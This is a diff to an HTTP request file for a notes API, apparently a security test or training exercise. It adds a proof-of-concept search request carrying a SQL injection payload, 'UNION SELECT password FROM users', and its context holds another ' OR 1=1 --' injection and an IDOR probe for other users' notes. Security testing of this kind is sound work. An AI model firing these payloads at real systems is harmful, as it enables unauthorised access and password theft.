@@ -71,6 +71,10 @@ Authorization: Bearer {{token}}
 GET {{baseUrl}}/notes/search?q=x%25' OR 1=1 --
 Authorization: Bearer {{token}}
 
+### Search notes — A10 PoC (broken SQLi payload leaks the full query + attacker input reflected in it)
+GET {{baseUrl}}/notes/search?q=' OR 1=1) UNION SELECT password FROM users --
+Authorization: Bearer {{token}}
+
 ### Get note by id (replace NOTE_ID with a sequential integer — this is the IDOR PoC, try ids that aren't yours)
 GET {{baseUrl}}/notes/NOTE_ID
 Authorization: Bearer {{token}}
